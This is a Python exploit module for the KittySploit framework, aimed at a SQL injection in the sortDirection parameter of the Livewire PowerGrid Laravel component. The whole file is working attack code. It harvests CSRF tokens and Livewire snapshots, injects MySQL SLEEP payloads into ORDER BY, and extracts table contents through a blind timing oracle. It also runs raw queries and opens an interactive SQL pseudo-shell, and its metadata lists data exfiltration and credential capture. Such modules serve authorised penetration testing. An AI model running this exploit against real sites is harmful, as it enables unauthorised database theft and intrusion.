#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-65971 — Livewire PowerGrid sortDirection time-based blind SQLi."""

from __future__ import annotations

import html
import json
import re
import time
from typing import Dict, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.sqli import Sqli, sqli_blind_extract_string


class _PowerGridTimeOracle:
    """Time-based blind oracle for PowerGrid ``sortDirection`` (ORDER BY)."""

    def __init__(self, module: "Module", *, delay: float = 3.0, threshold: float = 0.0):
        self.module = module
        self.delay = max(float(delay), 1.0)
        self.threshold = threshold if threshold > 0 else self.delay * 0.6
        self.baseline = 0.0
        self.requests = 0

    def calibrate(self) -> bool:
        self.baseline, _ = self.module._update("", "asc")
        self.requests += 1
        return self.true("1=1") and not self.true("1=2")

    def true(self, cond: str) -> bool:
        payload = f"asc, (SELECT IF(({cond}), SLEEP({int(self.delay)}), 0))"
        elapsed, _ = self.module._update("", payload)
        self.requests += 1
        return (elapsed - self.baseline) > self.threshold

    def gt(self, expr: str) -> bool:
        return self.true(expr)

    def errors(self, subquery: str) -> bool:
        return False

    def extract(self, subquery: str, *, max_length: int = 64) -> Optional[str]:
        # Time-based probes must stay single-threaded (SLEEP + parallel = noise).
        return sqli_blind_extract_string(
            self.true,
            self.gt,
            self.errors,
            subquery,
            threads=1,
            max_length=max_length,
        )


class Module(Auxiliary, Http_client, Sqli):
    __info__ = {
        "name": "Livewire PowerGrid CVE-2026-65971 sortDirection SQLi",
        "description": (
            "Confirms/exploits CVE-2026-65971: SQL injection in "
            "power-components/livewire-powergrid (>= 6.0.0, < 6.10.4) via the "
            "public Livewire property sortDirection. Columns with "
            "naturalSort(true) resolve {sortDirection} into orderByRaw() "
            "without sanitization. Empty sortField skips Laravel's "
            "asc/desc validation. Time-based blind confirmation (MySQL SLEEP), "
            "scalar extraction, and Sqli pseudo-shell (?tables, ?dump, …). "
            "Authorized targets only."
        ),
        "author": ["BiiTts", "KittySploit Team"],
        "cve": ["CVE-2026-65971"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-65971",
            "https://github.com/advisories/GHSA-7fgc-3h6c-698r",
            "https://github.com/BiiTts/POC-CVE-2026-65971",
            "https://github.com/Power-Components/livewire-powergrid",
        ],
        "tags": [
            "livewire",
            "powergrid",
            "laravel",
            "sqli",
            "blind",
            "time-based",
            "shell",
            "cve-2026-65971",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 12,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.3,
            "noise": 0.5,
            "value": 1.1,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["livewire", "laravel"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/livewire/update"],
                "param_any": ["sortDirection", "sortField"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": ""},
                    {"capability": "inj_param", "from_detail": "sortDirection"},
                    "shell",
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": ["post/http/sqli_shell"],
            },
        },
    }

    port = OptPort(80, "HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    path = OptString(
        "/",
        "Path of a page that renders a PowerGrid table with naturalSort",
        True,
    )
    livewire_update_path = OptString(
        "/livewire/update",
        "Livewire update endpoint",
        False,
        advanced=True,
    )
    cookie = OptString(
        "",
        "Optional Cookie header for authenticated tables (e.g. laravel_session=...)",
        False,
    )
    action = OptString(
        "test",
        "Action: test | extract | query | shell",
        False,
    )
    table = OptString("rooms", "Table for action=extract", False)
    column = OptString("secret", "Column for action=extract", False)
    where = OptString("", "Optional WHERE clause for action=extract", False)
    query = OptString(
        "",
        "Raw scalar subquery for action=query (overrides table/column)",
        False,
    )
    sleep_seconds = OptInteger(3, "MySQL SLEEP() seconds for true branch", False, advanced=True)
    threshold = OptFloat(
        0.0,
        "Seconds of delay over baseline counted as TRUE (0 = sleep * 0.6)",
        False,
        advanced=True,
    )
    max_length = OptInteger(64, "Max chars to extract", False, advanced=True)
    # Sqli mixin: shell_sqli, single_sql already defined on Sqli

    def __init__(self, framework=None):
        super().__init__(framework)
        self._csrf = ""
        self._snapshot = ""
        self._oracle: Optional[_PowerGridTimeOracle] = None

    def _timeout(self) -> int:
        sleep_s = max(int(self.sleep_seconds or 3), 1)
        return max(int(self.timeout or 30), sleep_s * 3 + 15)

    def _page_path(self) -> str:
        val = str(self.path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val

    def _update_path(self) -> str:
        val = str(self.livewire_update_path or "/livewire/update").strip() or "/livewire/update"
        if not val.startswith("/"):
            val = "/" + val
        return val

    def _extra_headers(self) -> Dict[str, str]:
        headers: Dict[str, str] = {"User-Agent": "KittySploit-CVE-2026-65971"}
        cookie = str(self.cookie or "").strip()
        if cookie:
            headers["Cookie"] = cookie
        return headers

    def _parse_cookies(self) -> Optional[Dict[str, str]]:
        cookie = str(self.cookie or "").strip()
        if not cookie:
            return None
        out: Dict[str, str] = {}
        for part in cookie.split(";"):
            part = part.strip()
            if not part or "=" not in part:
                continue
            name, value = part.split("=", 1)
            out[name.strip()] = value.strip()
        return out or None

    def _bootstrap(self) -> Tuple[bool, str]:
        response = self.http_request(
            method="GET",
            path=self._page_path(),
            headers=self._extra_headers(),
            cookies=self._parse_cookies(),
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not response:
            return False, "Failed to fetch PowerGrid page"
        body = response.text or ""

        csrf = None
        for pattern in (
            r'data-csrf="([A-Za-z0-9]+)"',
            r'"csrf"\s*:\s*"([A-Za-z0-9]+)"',
            r'name="csrf-token"\s+content="([^"]+)"',
            r"csrf-token\"\s+content='([^']+)'",
        ):
            match = re.search(pattern, body, re.I)
            if match:
                csrf = match.group(1)
                break

        snapshot = None
        for raw in re.findall(r'wire:snapshot="([^"]+)"', body):
            candidate = html.unescape(raw)
            if "sortDirection" in candidate or "PowerGrid" in candidate:
                snapshot = candidate
                break
        if not snapshot:
            for raw in re.findall(r'wire:initial-data="([^"]+)"', body):
                candidate = html.unescape(raw)
                if "sortDirection" in candidate or "PowerGrid" in candidate:
                    snapshot = candidate
                    break

        if not csrf:
            return False, "CSRF token not found (try cookie / correct path)"
        if not snapshot:
            return False, (
                "PowerGrid Livewire snapshot not found — page must render a "
                "PowerGrid component (naturalSort column) and session must reach it"
            )

        self._csrf = csrf
        self._snapshot = snapshot
        return True, f"csrf={csrf[:12]}… snapshot={len(snapshot)} bytes"

    def _update(self, sort_field: str, sort_direction: str) -> Tuple[float, str]:
        payload = {
            "_token": self._csrf,
            "components": [
                {
                    "snapshot": self._snapshot,
                    "updates": {
                        "sortField": sort_field,
                        "sortDirection": sort_direction,
                    },
                    "calls": [],
                }
            ],
        }
        headers = self._extra_headers()
        headers.update(
            {
                "Content-Type": "application/json",
                "X-CSRF-TOKEN": self._csrf,
                "X-Livewire": "1",
                "Accept": "application/json, text/html, */*",
            }
        )
        start = time.perf_counter()
        try:
            response = self.http_request(
                method="POST",
                path=self._update_path(),
                headers=headers,
                cookies=self._parse_cookies(),
                data=json.dumps(payload),
                timeout=self._timeout(),
                allow_redirects=False,
            )
            body = (response.text if response else "") or ""
        except Exception as exc:
            body = f"<error: {exc}>"
        return time.perf_counter() - start, body

    def _make_oracle(self) -> _PowerGridTimeOracle:
        return _PowerGridTimeOracle(
            self,
            delay=float(self.sleep_seconds or 3),
            threshold=float(self.threshold or 0.0),
        )

    def _confirm(self) -> Tuple[bool, str]:
        sleep_s = max(int(self.sleep_seconds or 3), 1)
        oracle = self._make_oracle()
        baseline, _ = self._update("", "asc")
        oracle.baseline = baseline
        oracle.requests += 1
        payload = f"asc, (SELECT SLEEP({sleep_s}))"
        elapsed, resp = self._update("", payload)
        oracle.requests += 1
        delta = elapsed - baseline
        threshold = oracle.threshold

        leak = re.search(
            r"SQLSTATE\[\w+\][^\"<]{0,160}|select .{0,60}order by[^\"<]{0,160}",
            resp,
            re.I,
        )
        detail = (
            f"baseline={baseline:.2f}s injected={elapsed:.2f}s "
            f"delta={delta:.2f}s threshold={threshold:.2f}s"
        )
        if leak:
            detail = f"{detail} | sql_echo={leak.group(0)[:160]}"

        if delta > threshold or leak:
            self._oracle = oracle
            if delta > threshold:
                return True, f"Time-based SQLi confirmed ({detail})"
            return True, f"SQLi likely (SQL echoed; timing inconclusive) ({detail})"
        return False, f"No measurable delay / SQL echo ({detail})"

    def _ensure_oracle(self) -> Optional[_PowerGridTimeOracle]:
        if self._oracle is not None:
            return self._oracle
        oracle = self._make_oracle()
        if not oracle.calibrate():
            print_error("Oracle calibration failed (1=1 / 1=2)")
            return None
        self._oracle = oracle
        return oracle

    def sqli_fetch_scalar(self, user_line: str) -> Optional[str]:
        """Sqli mixin entrypoint — blind extract via sortDirection SLEEP oracle."""
        oracle = self._ensure_oracle()
        if oracle is None:
            return None
        wrapped = self.wrap_scalar_expression(user_line)
        if not wrapped:
            return None
        inner = wrapped.strip()
        if inner.startswith("(") and inner.endswith(")"):
            inner = inner[1:-1].strip()
        if inner.upper().startswith("SELECT"):
            subquery = inner
        else:
            subquery = f"SELECT {inner}"
        return oracle.extract(
            subquery,
            max_length=max(int(self.max_length or 64), 1),
        )

    def check(self):
        ok, detail = self._bootstrap()
        if not ok:
            return {"vulnerable": False, "reason": detail, "confidence": "low"}
        confirmed, reason = self._confirm()
        return {
            "vulnerable": confirmed,
            "reason": reason,
            "confidence": "high" if confirmed else "medium",
        }

    def run(self):
        action = str(self.action or "test").strip().lower()
        if self.shell_sqli:
            action = "shell"

        print_status(
            f"CVE-2026-65971 PowerGrid sortDirection SQLi — action={action}, "
            f"path={self._page_path()}"
        )
        print_warning("Authorized testing only")

        ok, detail = self._bootstrap()
        if not ok:
            print_error(detail)
            return False
        print_info(detail)

        confirmed, reason = self._confirm()
        if not confirmed:
            print_error(reason)
            print_info(
                "Patched (>= 6.10.4), no naturalSort column, or component not reached."
            )
            return False

        print_warning(reason)
        self.set_info(
            severity="critical",
            reason=reason,
            path=self._page_path(),
            cve="CVE-2026-65971",
            injection="sortDirection",
            inj_param="sortDirection",
            inj_path=self._update_path(),
        )

        if action == "test":
            print_success("Confirmed CVE-2026-65971 (check-only)")
            reqs = self._oracle.requests if self._oracle else 0
            print_info(f"{reqs} request(s)")
            return True

        if action == "shell":
            print_status("Starting Sqli pseudo-shell (time-based — slow)")
            print_info("Shortcuts: ?version ?tables ?columns <t> ?dump <t> [n] | help | exit")
            self.shell_sqli = True
            self.handler_sqli()
            return True

        if action == "extract":
            table = str(self.table or "rooms").strip()
            column = str(self.column or "secret").strip()
            where = str(self.where or "").strip()
            subquery = f"SELECT {column} FROM {table}"
            if where:
                subquery += f" WHERE {where}"
            subquery += " LIMIT 1"
            user_line = subquery
        elif action == "query":
            user_line = str(self.query or self.single_sql or "").strip()
            if not user_line:
                print_error("action=query requires query or single_sql")
                return False
        else:
            print_error(f"Unknown action: {action}")
            print_info("Valid: test | extract | query | shell")
            return False

        print_status(f"Extracting via Sqli mixin: {user_line}")
        value = self.sqli_fetch_scalar(user_line)
        reqs = self._oracle.requests if self._oracle else 0
        if value is None:
            print_error("Extraction failed")
            print_info(f"{reqs} request(s)")
            return False
        if value == "":
            print_error("Empty extraction result")
            print_info(f"{reqs} request(s)")
            return True

        print_success(f"Leaked value: {value!r}")
        self.set_info(
            severity="critical",
            reason=f"{reason} | leaked={value!r}",
            path=self._page_path(),
            leaked=value,
            subquery=user_line,
            cve="CVE-2026-65971",
        )
        print_info(f"{reqs} request(s)")
        return True
